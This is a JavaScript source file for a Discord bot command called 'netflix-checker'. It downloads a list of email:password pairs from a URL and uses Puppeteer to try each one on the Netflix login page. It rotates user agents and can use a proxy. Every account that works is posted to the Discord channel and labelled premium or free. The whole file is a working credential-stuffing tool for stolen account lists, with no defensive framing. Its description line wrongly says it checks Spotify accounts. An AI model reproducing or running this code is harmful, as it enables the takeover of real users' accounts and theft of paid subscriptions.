const fs = require("fs");
const { RichEmbed } = require("discord.js");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");
const { getUserAgent, getPuppeteerOptions } = require("../../utils");
const { prefix } = require("../../config");

const document = {};
const URL = "https://www.netflix.com/login";

const getCredentials = url => fetch(url).then(res => res.text());

let error_count = 0;
let error_message = "";

const checkCredentials = async ({
  browser,
  credentials,
  message,
  msg,
  index,
  maxIndex,
  puppeteerParams
}) => {
  try {
    if (index < (maxIndex || credentials.length)) {
      const email = credentials[index].substring(
        0,
        credentials[index].indexOf(":")
      );
      const password = credentials[index].substring(
        credentials[index].indexOf(":") + 1
      );

      msg.edit(
        `Checking... (${index + 1}/${
          credentials.length
        })\n${email}:${password}\nError: ${error_count}\nMessage: \`${error_message}\``
      );

      const page = await browser.newPage();

      await page.setUserAgent(getUserAgent());
      await page.goto(URL, {
        waitUntil: "networkidle0"
      });
      await page.focus("input[id=id_userLoginId]");
      await page.keyboard.type(email);
      await page.focus("input[id=id_password]");
      await page.keyboard.type(password);

      try {
        await page.waitFor(100);
        await page.click("button[data-uia=login-submit-button]");
      } catch (err) {
        // do nothing
      }

      await page.waitFor(3000);

      const cred_status = await page.evaluate(() => {
        if (document.querySelector(".ui-message-contents")) {
          return "failed";
        }

        if (document.querySelector(".free-trial-card")) {
          return "free";
        }

        if (document.querySelector(".profile-gate-label")) {
          return "premium";
        }
      });

      if (cred_status === "premium" || cred_status === "free") {
        message.channel.send(`${cred_status} -> ${email}:${password}`);

        await browser.close();
        const puppeteerOptions = await getPuppeteerOptions(puppeteerParams);
        const newBrowser = await puppeteer.launch(puppeteerOptions);
        checkCredentials({
          browser: newBrowser,
          credentials,
          message,
          msg,
          index: index + 1,
          maxIndex,
          puppeteerParams
        });
      }

      if (cred_status === "failed") {
        await page.close();
        checkCredentials({
          browser,
          credentials,
          message,
          msg,
          index: index + 1,
          maxIndex,
          puppeteerParams
        });
      }
    }
  } catch (err) {
    error_count++;
    // eslint-disable-next-line require-atomic-updates
    error_message = err;
    await browser.close();
    const puppeteerOptions = await getPuppeteerOptions();
    const newBrowser = await puppeteer.launch(puppeteerOptions);
    checkCredentials({
      browser: newBrowser,
      credentials,
      message,
      msg,
      index: index + 1,
      maxIndex,
      puppeteerParams
    });
  }
};

module.exports = {
  name: "netflix-checker",
  aliases: ["nc"],
  description: "Check spotify accounts from a list",
  args: true,
  usage: `http://example.com/file.txt no 1 12`,
  devOnly: true,
  async execute(message, args) {
    const useProxy = args[1] || "no";
    const initialIndex = parseInt(args[2], 10) || 0;
    const maxIndex = parseInt(args[3], 10) || 0;
    const textResult = await getCredentials(args[0]);
    const credentials = textResult
      .split("\n")
      .map(cred => {
        const thereIsSpace = cred.indexOf(" ") === -1;
        const lastIndex = thereIsSpace ? cred.length : cred.indexOf(" ");

        return cred.includes("@") && cred.substring(0, lastIndex);
      })
      .filter(val => !!val);

    const puppeteerParams = useProxy === "yes" ? URL : "";
    const puppeteerOptions = await getPuppeteerOptions(puppeteerParams);
    const browser = await puppeteer.launch(puppeteerOptions);

    return message.channel.send("Please wait...").then(async msg => {
      await checkCredentials({
        browser,
        credentials,
        message,
        msg,
        index: initialIndex,
        maxIndex,
        puppeteerParams
      });
    });
  }
};
